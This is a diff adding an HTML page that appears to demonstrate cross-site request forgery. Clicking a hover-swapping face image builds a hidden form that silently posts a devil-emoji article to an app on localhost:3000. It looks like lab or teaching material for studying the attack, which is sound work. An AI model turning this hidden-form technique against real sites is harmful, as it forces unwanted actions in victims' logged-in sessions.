@@ -1,0 +1,45 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title></title>
+  <style>
+   #image {
+     background: url("smiling-face.png") no-repeat left center;
+     width: 120px;
+     height: 120px;
+   }
+
+   #image:hover {
+     background: url("devil-face.png") no-repeat left center;
+   }
+  </style>
+</head>
+
+<body>
+  <script>
+  </script>
+  <div id="image"
+   onclick="
+     var f = document.createElement('form');
+     f.style.display = 'none';
+     this.parentNode.appendChild(f);
+     f.method = 'POST';
+     f.action = 'http://localhost:3000/articles';
+
+     var article_title = document.createElement('input');
+     article_title.type = 'text';
+     article_title.name = 'article[title]';
+     article_title.value = '😈😈😈😈😈😈';
+     f.appendChild(article_title);
+
+     var article_text = document.createElement('textarea');
+     article_text.name = 'article[text]';
+     article_text.value = '😈😈😈😈😈😈😈😈😈😈😈😈';
+     f.appendChild(article_text);
+
+     f.submit();
+     return false;
+   "></div>
+</body>
+</html>
